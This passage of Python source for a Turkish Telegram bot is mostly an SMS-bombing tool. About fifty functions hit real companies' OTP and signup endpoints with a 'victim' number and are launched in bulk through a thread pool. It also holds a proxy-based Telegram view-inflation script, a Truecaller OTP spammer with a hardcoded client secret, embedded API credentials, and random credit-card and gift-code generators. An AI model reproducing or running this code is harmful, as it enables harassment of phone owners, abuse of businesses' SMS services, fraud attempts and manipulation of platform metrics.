        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "İpragaz"
        else:
            return False, "İpragaz"
    except:
        return False, "İpragaz"

def pisir(number):
    try:
        url = "https://api.pisir.com/v1/login/"
        payload = {"msisdn": f"90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["ok"]
        if r1 == "1":
            return True, "Pişir"
        else:
            return False, "Pişir"
    except:
        return False, "Pişir"

def coffy(number):
    try:
        url = "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode"
        payload = {"phoneNumber": f"+90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "Coffy"
        else:
            return False, "Coffy"
    except:
        return False, "Coffy"

def sushico(number):
    try:
        url = "https://api.sushico.com.tr/tr/sendActivation"
        payload = {"phone": f"+90{number}", "location": 1, "locale": "tr"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["err"]
        if r1 == 0:
            return True, "SushiCo"
        else:
            return False, "SushiCo"
    except:
        return False, "SushiCo"

def kalmasin(number):
    try:
        url = "https://api.kalmasin.com.tr/user/login"
        payload = {
            "dil": "tr",
            "device_id": "",
            "notification_mobile": "android-notificationid-will-be-added",
            "platform": "android",
            "version": "2.0.6",
            "login_type": 1,
            "telefon": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "Kalmasın"
        else:
            return False, "Kalmasın"
    except:
        return False, "Kalmasın"

def yotto(number):
    try:
        url = "https://42577.smartomato.ru/account/session.json"
        payload = {
            "phone" : f"+90 ({str(number)[0:3]}) {str(number)[3:6]}-{str(number)[6:10]}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 201:
            return True, "Yotto"
        else:
            return False, "Yotto"
    except:
        return False, "Yotto"

def qumpara(number):
    try:
        url = "https://tr-api.fisicek.com/v1.4/auth/getOTP"
        payload = {
            "msisdn" : f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Qumpara"
        else:
            return False, "Qumpara"
    except:
        return False, "Qumpara"

def aygaz(number):
    try:
        url = "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode"
        payload = {
            "Gsm" : f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Aygaz"
        else:
            return False, "Aygaz"
    except:
        return False, "Aygaz"

def pawapp(number):
    try:
        url = "https://api.pawder.app/api/authentication/sign-up"
        payload = {
            "languageId" : "2",
            "mobileInformation" : "",
            "data" : {
                "firstName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                "lastName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                "userAgreement" : "true",
                "kvkk" : "true",
                "email" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com",
                "phoneNo" : f"{number}",
                "username" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=10))}"
            }
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "PawAPP"
        else:
            return False, "PawAPP"
    except:
        return False, "PawAPP"

def mopas(number):
    try:
        url = "https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials"
        r = requests.post(url=url, timeout=2)
        
        if r.status_code == 200:
            token = json.loads(r.text)["access_token"]
            token_type = json.loads(r.text)["token_type"]
            url = f"https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber={number}"
            headers = {"authorization": f"{token_type} {token}"}
            r1 = requests.get(url=url, headers=headers, timeout=2)
            
            if r1.status_code == 200:
                return True, "Mopaş"
            else:
                return False, "Mopaş"
        else:
            return False, "Mopaş"
    except:
        return False, "Mopaş"

def paybol(number):
    try:
        url = "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms"
        payload = {
            "otp_code" : "null",
            "phone_number" : f"90{number}",
            "reference_id" : "null"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        
        if r.status_code == 200:
            return True, "Paybol"
        else:
            return False, "Paybol"
    except:
        return False, "Paybol"

def ninewest(number):
    try:
        url = "https://www.ninewest.com.tr/webservice/v1/register.json"
        payload = {
            "alertMeWithEMail" : False,
            "alertMeWithSms" : False,
            "dataPermission" : True,
            "email" : "asdafwqww44wt4t4@gmail.com",
            "genderId" : random.randint(0,3),
            "hash" : "5488b0f6de",
            "inviteCode" : "",
            "password" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=16))}",
            "phoneNumber" : f"({str(number)[0:3]}) {str(number)[3:6]} {str(number)[6:8]} {str(number)[8:10]}",
            "registerContract" : True,
            "registerMethod" : "mail",
            "version" : "3"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        
        if r1 == True:
            return True, "Nine West"
        else:
            return False, "Nine West"
    except:
        return False, "Nine West"

def saka(number):
    try:
        url = "https://mobilcrm2.saka.com.tr/api/customer/login"
        payload = {
            "gsm" : f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["status"]
        if r1 == 1:
            return True, "Saka"
        else:
            return False, "Saka"
    except:
        return False, "Saka"

def superpedestrian(number):
    try:
        url = "https://consumer-auth.linkyour.city/consumer_auth/register"
        payload = {
            "phone_number" : f"+90{str(number)[0:3]} {str(number)[3:6]} {str(number)[6:10]}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["detail"]
        if r1 == "Ok":
            return True, "Superpedestrian"
        else:
            return False, "Superpedestrian"
    except:
        return False, "Superpedestrian"

def hayat(number):
    try:
        url = f"https://www.hayatsu.com.tr/api/signup/otpsend?mobilePhoneNumber={number}"
        r = requests.post(url=url, timeout=5)
        r1 = json.loads(r.text)["IsSuccessful"]
        if r1 == True:
            return True, "Hayat"
        else:
            return False, "Hayat"
    except:
        return False, "Hayat"

def tazi(number):
    try:
        url = "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
        payload = {
            "cep_tel" : f"{number}",
            "cep_tel_ulkekod" : "90"
        }
        headers = {
            "authorization" : "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Tazı"
        else:
            return False, "Tazı"
    except:
        return False, "Tazı"

def gofody(number):
    try:
        url = "https://backend.gofody.com/api/v1/enduser/register/"
        payload = {
            "country_code": "90",
            "phone": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "GoFody"
        else:
            return False, "GoFody"
    except:
        return False, "GoFody"

def weescooter(number):
    try:
        url = "https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin"
        payload = {
            "tenant": "62a1e7efe74a84ea61f0d588",
            "gsm": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Wee Scooter"
        else:
            return False, "Wee Scooter"
    except:
        return False, "Wee Scooter"

def scooby(number):
    try:
        url = f"https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90{number}"
        r = requests.get(url=url, timeout=5)
        if r.status_code == 200:
            return True, "Scooby"
        else:
            return False, "Scooby"
    except:
        return False, "Scooby"

def gez(number):
    try:
        url = f"https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90{number}"
        r = requests.get(url=url, timeout=5)
        r1 = json.loads(r.text)["succeeded"]
        if r1 == True:
            return True, "Gez"
        else:
            return False, "Gez"
    except:
        return False, "Gez"

def heyscooter(number):
    try:
        url = f"https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={number}"
        headers = {"user-agent" : "okhttp/3.12.1"}
        r = requests.post(url=url, headers=headers, timeout=5)
        r1 = json.loads(r.text)["IsSuccess"]
        if r1 == True:
            return True, "Hey Scooter"
        else:
            return False, "Hey Scooter"
    except:
        return False, "Hey Scooter"

def jetle(number):
    try:
        url = f"http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={number}&firmaID=1048"
        r = requests.get(url=url, timeout=5)
        if r.status_code == 200:
            return True, "Jetle"
        else:
            return False, "Jetle"
    except:
        return False, "Jetle"

def rabbit(number):
    try:
        url = "https://api.rbbt.com.tr/v1/auth/authenticate"
        payload = {
            "mobile_number" : f"+90{number}",
            "os_name" : "android",
            "os_version" : "7.1.2",
            "app_version" : " 1.0.2(12)",
            "push_id" : "-"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["status"]
        if r1 == True:
            return True, "Rabbit"
        else:
            return False, "Rabbit"
    except:
        return False, "Rabbit"

def roombadi(number):
    try:
        url = "https://api.roombadi.com/api/v1/auth/otp/authenticate"
        payload = {"phone": f"{number}", "countryId": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Roombadi"
        else:
            return False, "Roombadi"
    except:
        return False, "Roombadi"

def hizliecza(number):
    try:
        url = "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP"
        payload = {"phoneNumber": f"+90{number}", "otpOperationType": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSuccess"]
        if r1 == True:
            return True, "Hızlı Ecza"
        else:
            return False, "Hızlı Ecza"
    except:
        return False, "Hızlı Ecza"

def signalall(number):
    try:
        url = "https://appservices.huzk.com/client/register"
        payload = {
            "name": "",
            "phone": {
                "number": f"{number}",
                "code": "90",
                "country_code": "TR",
                "name": ""
            },
            "countryCallingCode": "+90",
            "countryCode": "TR",
            "approved": True,
            "notifyType": 99,
            "favorites": [],
            "appKey": "live-exchange"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "SignalAll"
        else:
            return False, "SignalAll"
    except:
        return False, "SignalAll"

def goyakit(number):
    try:
        url = f"https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={number}&isRegistered=false"
        r = requests.get(url=url, timeout=5)
        r1 = json.loads(r.text)["data"]["success"]
        if r1 == True:
            return True, "Go Yakıt"
        else:
            return False, "Go Yakıt"
    except:
        return False, "Go Yakıt"

def pinar(number):
    try:
        url = "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp"
        payload = {
            "MobilePhone" : f"{number}"
        }
        headers = {
            "devicetype" : "android",
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.text == True:
            return True, "Pınar"
        else:
            return False, "Pınar"
    except:
        return False, "Pınar"

def oliz(number):
    try:
        url = "https://api.oliz.com.tr/api/otp/send"
        payload = {
            "mobile_number" : f"{number}",
            "type" : None
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["meta"]["messages"]["success"][0]
        if r1 == "SUCCESS_SEND_SMS":
            return True, "Oliz"
        else:
            return False, "Oliz"
    except:
        return False, "Oliz"

def macrocenter(number):
    try:
        url = f"https://www.macrocenter.com.tr/rest/users/login/otp?reid={int(time.time())}"
        payload = {
            "phoneNumber" : f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["successful"]
        if r1 == True:
            return True, "Macro Center"
        else:
            return False, "Macro Center"
    except:
        return False, "Macro Center"

def marti(number):
    try:
        url = "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin"
        payload = {
            "mobilePhone" : f"{number}",
            "mobilePhoneCountryCode" : "90"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSuccess"]
        if r1 == True:
            return True, "Martı"
        else:
            return False, "Martı"
    except:
        return False, "Martı"

def karma(number):
    try:
        url = "https://api.gokarma.app/v1/auth/send-sms"
        payload = {
            "phoneNumber" : f"90{number}",
            "type" : "REGISTER",
            "deviceId" : f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}",
            "language" : "tr-TR"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 201:
            return True, "Karma"
        else:
            return False, "Karma"
    except:
        return False, "Karma"

def joker(number):
    try:
        url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
        payload = {
            "phone" : f"{number}"
        }
        headers = {
            "user-agent" : ""
        }
        r = requests.post(url=url, headers=headers, data=payload, timeout=5)
        r1 = json.loads(r.text)["success"]

        if r1 == True:
            return True, "Joker"
        else:
            return False, "Joker"
    except:
        return False, "Joker"

def hop(number):
    try:
        url = "https://api.hoplagit.com:443/v1/auth:reqSMS"
        payload = {
            "phone" : f"+90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 201:
            return True, "Hop"
        else:
            return False, "Hop"
    except:
        return False, "Hop"

def kimgbister(number):
    try:
        url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"
        payload = {
            "msisdn" : f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 200:
            return True, "Kim GB Ister"
        else:
            return False, "Kim GB Ister"
    except:
        return False, "Kim GB Ister"

def anadolu(number):
    try:
        url = "https://www.anadolu.com.tr/Iletisim_Formu_sms.php"
        payload = urllib.parse.urlencode({
            "Numara": f"{str(number)[0:3]}{str(number)[3:6]}{str(number)[6:8]}{str(number)[8:10]}"
        })
        headers = {
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        }
        r = requests.post(url=url, headers=headers, data=payload, timeout=5)
        if r.status_code == 200:
            return True, "Anadolu"
        else:
            return False, "Anadolu"
    except:
        return False, "Anadolu"

def total(number):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    try:
        url = f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={number}"
        r = requests.post(url=url, verify=False, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "Total"
        else:
            return False, "Total"
    except:
        return False, "Total"

def englishhome(number):
    try:
        url = "https://www.englishhome.com:443/enh_app/users/registration/"
        payload = {
            "first_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "last_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}@gmail.com",
            "phone": f"0{number}",
            "password": f"{''.join(random.choices(string.ascii_lowercase + string.digits + string.ascii_uppercase, k=8))}",
            "email_allowed": False,
            "sms_allowed": False,
            "confirm": True,
            "tom_pay_allowed": True
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 202:
            return True, "English Home"
        else:
            return False, "English Home"
    except:
        return False, "English Home"

def petrolofisi(number):
    try:
        url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
        payload = {
            "approvedContractVersion": "v1",
            "approvedKvkkVersion": "v1",
            "contractPermission": True,
            "deviceId": "",
            "etkContactPermission": True,
            "kvkkPermission": True,
            "mobilePhone": f"0{number}",
            "name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "plate": f"{str(random.randrange(1, 81)).zfill(2)}{''.join(random.choices(string.ascii_uppercase, k=3))}{str(random.randrange(1, 999)).zfill(3)}",
            "positiveCard": "",
            "referenceCode": "",
            "surname": f"{''.join(random.choices(string.ascii_lowercase, k=8))}"
        }
        headers = {
            "X-Channel": "IOS"
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.status_code == 204:
            return True, "Petrol Ofisi"
        else:
            return False, "Petrol Ofisi"
    except:
        return False, "Petrol Ofisi"
        
def servis_gonderici(tel_no, servis):
    global toplam_gonderimler, basarili_gonderimler, basarisiz_gonderimler
    sonuc = servis(number=tel_no)
    if sonuc[0]:
        toplam_gonderimler += 1
        basarili_gonderimler += 1
    else:
        toplam_gonderimler += 1
        basarisiz_gonderimler += 1

# gonderim_baslat fonksiyonu
# gonderim_baslat fonksiyonu
def gonderim_baslat(tel_no, mesaj_sayisi, calisan_sayisi, mesaj, orijinal_mesaj_sayisi):
    global toplam_gonderimler, basarili_gonderimler, basarisiz_gonderimler
    toplam_gonderimler = 0
    basarili_gonderimler = 0
    basarisiz_gonderimler = 0

    # Servis listesi burada tanımlanıyor
    servis_listesi = [a101, anadolu, aygaz, bim, bisu, ceptesok, coffy, defacto, englishhome, file, gez, gofody, goyakit, hayat, heyscooter, hizliecza, hop, ikinciyeni, ipragraz, istegelsin, jetle, joker, kalmasin, karma, kimgbister, macrocenter, marti, migros, mopas, ninewest, oliz, pawapp, paybol, petrolofisi, pinar, pisir, qumpara, rabbit, roombadi, saka, scooby, signalall, superpedestrian, sushico, tazi, tiklagelsin, total, weescooter, yotto]

    random.shuffle(servis_listesi)
    
    # Geçici mesajı gönder
    temp_message = bot.send_message(mesaj.chat.id, "SMS'LER KURBANA ATILIYOR 😈\n\nLütfen Bekle Sana Bilgileri Vericem...")
    
    baslangic_zamani = time.perf_counter()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=calisan_sayisi) as yurutucu:
        for i in range(mesaj_sayisi):
            yurutucu.submit(servis_gonderici, tel_no, servis_listesi[i % len(servis_listesi)])
    
    sure = int(time.perf_counter() - baslangic_zamani)
    
    orijinal_basarili_gonderimler = int((basarili_gonderimler / mesaj_sayisi) * orijinal_mesaj_sayisi)
    orijinal_basarisiz_gonderimler = orijinal_mesaj_sayisi - orijinal_basarili_gonderimler
    
    # Geçici mesajı sonuçlarla değiştir
    bot.edit_message_text(chat_id=mesaj.chat.id, message_id=temp_message.message_id, text=f"Bu Numaraya;\n{tel_no} SMS Bombası Gönderimi Tamamlandı!\n\n{orijinal_mesaj_sayisi} SMS, \n{sure} saniye içerisinde gönderildi. \n\nGönderilen SMS'ler;\n{orijinal_basarili_gonderimler} başarılı, {orijinal_basarisiz_gonderimler} başarısız.\n")    

cancel_process = {}

def genis_karakter_seti_olustur():
    sayilar = '0123456789'
    kucuk_harfler = 'abcdefghijklmnopqrstuvwxyz'
    buyuk_harfler = kucuk_harfler.upper()
    ozel_karakterler = '!@#$%^&*()_+-=[]{}|;\':",./<>?'
    return sayilar + kucuk_harfler + buyuk_harfler + ozel_karakterler

def sifre_guvenlik_olc(sifre, chat_id, temp_message_id):
    karakterler = genis_karakter_seti_olustur()
    max_uzunluk = len(sifre)
    baslangic_zamani = datetime.now()
    deneme_sayisi = 0
    
    for uzunluk in range(1, max_uzunluk + 1):
        for deneme in product(karakterler, repeat=uzunluk):
            if cancel_process.get(chat_id, False):
                bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text="Şifre kontrolü iptal edildi.")
                return
            denenen_sifre = ''.join(deneme)
            deneme_sayisi += 1
            if denenen_sifre == sifre:
                bitis_zamani = datetime.now()
                kirma_suresi = (bitis_zamani - baslangic_zamani).total_seconds()
                
                guvenlik_durumu = "Zayıf" if deneme_sayisi < 10000 else "Güvenli"
                oneri = "Şifrenizi Güçlendirmenizi Öneririm" if guvenlik_durumu == "Zayıf" else "Şifreniz Aşırı Güvenli."
                
                mesaj = f"Şifre Kırıldı: {denenen_sifre}\nŞifre Kırma Süresi: {kirma_suresi} saniye\nDenenen Şifre Sayısı: {deneme_sayisi}\nŞifre Güvenliği: {guvenlik_durumu}. {oneri}"
                bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text=mesaj)
                return
    if not cancel_process.get(chat_id, False):
        bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text="Şifre kırma işlemi tamamlandı ama şifre bulunamadı.")

@bot.message_handler(commands=['sifre_guvenligi'])
@safe_execute
@check_membership
@user_is_logged_in
def sifre_guvenligi_mesaji(message):
    msg_parts = message.text.split(maxsplit=1)
    chat_id = message.chat.id
    if len(msg_parts) < 2:
        bot.reply_to(message, "Bu Komut Şifrenin Ne Kadar Güvenli Olduğunu, Kaç Saniyede Ve Kaç Denemede Çözüldüğünü Gösterir, Böylece Şifrenin Güvenliğine Göre Şifreler Seçebilirsiniz.\nÖrnek Kullanım;\n/sifre_guvenligi 123\n\nBu Komut 123 Şifresinin Güvenliğini Söyler")
    else:
        cancel_process[chat_id] = False
        sifre = msg_parts[1]
        temp_message: Message = bot.reply_to(message, "Şifren Sanırım Biraz Uzun Biraz Bekle Şifrenin Kaç Sürede Çözüleceğini Sana Vericem. \nEğer Beklemek İstemiyorsan /sifreiptal Yazarak Şifre Kontrolünü İptal Et Ve Botu Kullanmaya Devam Et")
        threading.Thread(target=sifre_guvenlik_olc, args=(sifre, chat_id, temp_message.message_id)).start()

@bot.message_handler(commands=['sifreiptal'])
@safe_execute
@check_membership
@user_is_logged_in
def sifre_iptal(message):
    chat_id = message.chat.id
    cancel_process[chat_id] = True                
    
# Gerekli Ayarlar
THREADS = 500
PROXIES_TYPES = ('http', 'socks4', 'socks5')
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'
REGEX = compile(r"(?:^|\D)?(("+ r"(?:[1-9]|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])"
                + r"\." + r"(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])"
                + r"\." + r"(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])"
                + r"\." + r"(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])"
                + r"):" + (r"(?:\d|[1-9]\d{1,3}|[1-5]\d{4}|6[0-4]\d{3}"
                + r"|65[0-4]\d{2}|655[0-2]\d|6553[0-5])")
                + r")(?:\D|$)")

errors = open('errors.txt', 'a+')
cfg = ConfigParser(interpolation=None)
cfg.read("config.ini", encoding="utf-8")

http, socks4, socks5 = '', '', ''
try: http, socks4, socks5 = cfg["HTTP"], cfg["SOCKS4"], cfg["SOCKS5"]
except KeyError: print(' [ OUTPUT ] Error | config.ini not found!');time.sleep(3);exit()

http_proxies, socks4_proxies, socks5_proxies = [], [], []
proxy_errors, token_errors = 0, 0
channel, post, time_out, real_views = '', 0, 15, 0

def scrap(sources, _proxy_type):
    for source in sources:
        if source:
            try: response = requests.get(source, timeout=time_out)
            except Exception as e: errors.write(f'{e}\n')
            if tuple(REGEX.finditer(response.text)):
                for proxy in tuple(REGEX.finditer(response.text)):
                    if _proxy_type == 'http': http_proxies.append(proxy.group(1))
                    elif _proxy_type == 'socks4': socks4_proxies.append(proxy.group(1))
                    elif _proxy_type == 'socks5': socks5_proxies.append(proxy.group(1))


def start_scrap():
    threads = []
    for i in (http_proxies, socks4_proxies, socks5_proxies): i.clear()
    for i in ((http.get("Sources").splitlines(), 'http'), (socks4.get("Sources").splitlines(), 'socks4'), (socks5.get("Sources").splitlines(), 'socks5')):
        thread = Thread(target=scrap, args=(i[0], i[1]))
        threads.append(thread)
        thread.start()
    for t in threads: t.join()


def get_token(proxy, proxy_type):
    try:
        session = requests.session()
        response = session.get(f'https://t.me/{channel}/{post}', params={'embed': '1', 'mode': 'tme'},
                    headers={'referer': f'https://t.me/{channel}/{post}', 'user-agent': USER_AGENT},
                    proxies={'http': f'{proxy_type}://{proxy}', 'https': f'{proxy_type}://{proxy}'},
                    timeout=time_out)
        return search('data-view="([^"]+)', response.text).group(1), session
    except AttributeError: return 2
    except requests.exceptions.RequestException: 1
    except Exception as e: return errors.write(f'{e}\n')


def send_view(token, session, proxy, proxy_type):
    try:
        cookies_dict = session.cookies.get_dict()
        response = session.get('https://t.me/v/', params={'views': str(token)}, cookies={
            'stel_dt': '-240', 'stel_web_auth': 'https%3A%2F%2Fweb.telegram.org%2Fz%2F',
            'stel_ssid': cookies_dict.get('stel_ssid', None), 'stel_on': cookies_dict.get('stel_on', None)},
                            headers={'referer': f'https://t.me/{channel}/{post}?embed=1&mode=tme',
                                'user-agent': USER_AGENT, 'x-requested-with': 'XMLHttpRequest'},
                            proxies={'http': f'{proxy_type}://{proxy}', 'https': f'{proxy_type}://{proxy}'},
                            timeout=time_out)
        return True if (response.status_code == 200 and response.text == 'true') else False
    except requests.exceptions.RequestException: 1
    except Exception: pass


def control(proxy, proxy_type):
    global proxy_errors, token_errors
    token_data = get_token(proxy, proxy_type)
    if token_data == 2: token_errors += 1
    elif token_data == 1: proxy_errors += 1
    elif token_data:
        send_data = send_view(token_data[0], token_data[1], proxy, proxy_type)
        if send_data == 1: proxy_errors += 1


def start_view():
    c, threads = 0, []
    start_scrap()
    for i in [http_proxies, socks4_proxies, socks5_proxies]:
        for j in i:
            thread = Thread(target=control, args=(j, PROXIES_TYPES[c]))
            threads.append(thread)
            while active_count() > THREADS: time.sleep(0.05)
            thread.start()
        c += 1
        time.sleep(2)
    for t in threads:
        t.join()
        start_view()


def check_views():
    global real_views
    while True:
        try:
            telegram_request = requests.get(f'https://t.me/{channel}/{post}', params={'embed': '1', 'mode': 'tme'},
                                headers={'referer': f'https://t.me/{channel}/{post}', 'user-agent': USER_AGENT})
            real_views = search('<span class="tgme_widget_message_views">([^<]+)', telegram_request.text).group(1)
            time.sleep(2)
        except: pass
        


def send_spam(phone_number, chat_id):
    random_digits = '123456789'
    random_string = ''.join(random.choice(random_digits) for _ in range(10))
    md5_hash = hashlib.md5(random_string.encode()).hexdigest()[:16]
    
    request_headers = {
        "Host": "account-asia-south1.truecaller.com",
        "content-type": "application/json; charset=UTF-8",
        "content-length": "680",
        "accept-encoding": "gzip",
        "user-agent": "Truecaller/12.34.8 (Android;8.1.2)",
        "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
    }
    
    request_data = {
        "countryCode": "eg",
        "dialingCode": 20,
        "installationDetails": {
            "app": {
                "buildVersion": 8,
                "majorVersion": 12,
                "minorVersion": 34,
                "store": "GOOGLE_PLAY"
            },
            "device": {
                "deviceId": md5_hash,
                "language": "ar",
                "manufacturer": "Xiaomi",
                "mobileServices": ["GMS"],
                "model": "Redmi Note 8A Prime",
                "osName": "Android",
                "osVersion": "7.1.2",
                "simSerials": [
                    "8920022021714943876f",
                    "8920022022805258505f"
                ]
            }
        },
        "language": "ar",
        "sims": [
            {
                "imsi": "602022207634386",
                "mcc": "602",
                "mnc": "2",
                "operator": "vodafone"
            },
            {
                "imsi": "602023133590849",
                "mcc": "602",
                "mnc": "2",
                "operator": "vodafone"
            }
        ],
        "storeVersion": {
            "buildVersion": 8,
            "majorVersion": 12,
            "minorVersion": 34
        },
        "phoneNumber": phone_number,
        "region": "region-2",
        "sequenceNo": 1
    }
    
    response = requests.post("https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp", headers=request_headers, json=request_data)

    if response.status_code == 200:
        bot.send_message(chat_id, "Gönderildi.")
    else:
        bot.send_message(chat_id, "Hata, Lütfen Telefon Numarasını Şu Biçimde Gir:\n+905555555555")


    
@bot.message_handler(commands=['cc'])
@safe_execute
@check_membership
@user_is_logged_in
def cc_command(message):
    msg_text = message.text.split()

    if len(msg_text) == 1:
        reply_message = ("Kendine Özel CC Üretmen İçin /cc Yazıp Yanına Kaç Tane Üreteceğini Yaz\n"
                         "Örnek Kullanım;\n"
                         "/cc 3\n"
                         "Mesela Bu Komut 3 Tane CC Üretir\n\nNOT;\n"
                         "CC'ler Random Üretilir Ve Kesin Girme İhtimalleri Yoktur")
        bot.send_message(chat_id=message.chat.id, text=reply_message)
    elif len(msg_text) == 2 and msg_text[1].isdigit():
        cc_sayisi = int(msg_text[1])
        uretilen_ccler = []
        for _ in range(cc_sayisi):
            cc_numarasi = ''.join(random.choice('1234567890') for _ in range(16))
            ay = str(random.randint(1, 12)).zfill(2)
            yil = str(random.randint(22, 30))
            cvv = ''.join(random.choice('1234567890') for _ in range(3))
            cc_bilgisi = f"`{cc_numarasi}|{ay}/{yil}|{cvv}`"  # CC bilgisini ters tırnaklar içinde formatla
            uretilen_ccler.append(cc_bilgisi)
        reply_message = "Üretilen Random CC'lerin:\n\n" + "\n".join(uretilen_ccler)
        bot.send_message(chat_id=message.chat.id, text=reply_message, parse_mode='Markdown')
    else:
        bot.send_message(chat_id=message.chat.id, text="Hatalı kullanım. Lütfen /cc [sayı] formatını kullanın.")
        
def get_exchange_rate(base, target):
    url = f"https://v6.exchangerate-api.com/v6/{EXCHANGE_API_KEY}/latest/{base}"
    response = requests.get(url)
    if response.status_code != 200:
        return None
    data = response.json()
    return data['conversion_rates'].get(target, None)
    
@bot.message_handler(commands=['playkod'])
@safe_execute
@check_membership
@user_is_logged_in
def uret_playkod(message):
    mesaj_metni = message.text.split()

    if len(mesaj_metni) == 1:
        yanit_mesaji = ("Eğer Play Kod Üretebilmek İstiyorsan Önce /playkod Komutunu Yaz Ardından Kaç Tane Üretmek İstediğini Gir\n"
                        "Örnek Kullanım;\n"
                        "/playkod 3\n"
                        "Mesela Bu Komut 3 Tane Play Kod Üretir.\n\n"
                        "NOT;\n"
                        "Play Kodlar Random Üretilir Ve Kesin Girme İhtimalleri Yoktur\n\nEğer Play Kodlarınızın Çalışıp Çalışmadığını Kontrol Etmek İstersen /playkodcheck Komutunu Kullan.")
        bot.send_message(chat_id=message.chat.id, text=yanit_mesaji)
    elif len(mesaj_metni) == 2 and mesaj_metni[1].isdigit():
        istenen_kod_sayisi = int(mesaj_metni[1])
        olusturulan_kodlar = []
        for _ in range(istenen_kod_sayisi):
            karakterler = 'ABCDEFGHIJKLMNOPRSTEUVYZ1234567890'
            ayirac = '-'
